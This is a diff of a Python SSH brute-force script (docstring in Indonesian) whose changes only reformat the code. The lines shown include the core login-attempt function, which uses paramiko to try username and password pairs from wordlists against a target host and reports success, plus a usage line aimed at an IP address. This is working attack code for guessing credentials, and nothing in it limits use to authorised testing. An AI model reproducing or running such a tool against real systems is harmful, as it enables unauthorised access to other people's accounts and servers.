@@ -4,6 +4,7 @@ SSH Bruteforcer
 Brute force SSH login dengan password list.
 Usage: python ssh_bruteforce.py -t 192.168.1.1 -U users.txt -w passwords.txt
 """
+
 import paramiko
 import argparse
 import sys
@@ -15,8 +16,17 @@ def try_ssh(host, port, username, password, timeout=5):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        client.connect(host, port=port, username=username, password=password, timeout=timeout,
-                       banner_timeout=timeout, auth_timeout=timeout, allow_agent=False, look_for_keys=False)
+        client.connect(
+            host,
+            port=port,
+            username=username,
+            password=password,
+            timeout=timeout,
+            banner_timeout=timeout,
+            auth_timeout=timeout,
+            allow_agent=False,
+            look_for_keys=False,
+        )
         client.close()
         return True
     except paramiko.AuthenticationException:
@@ -84,4 +94,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
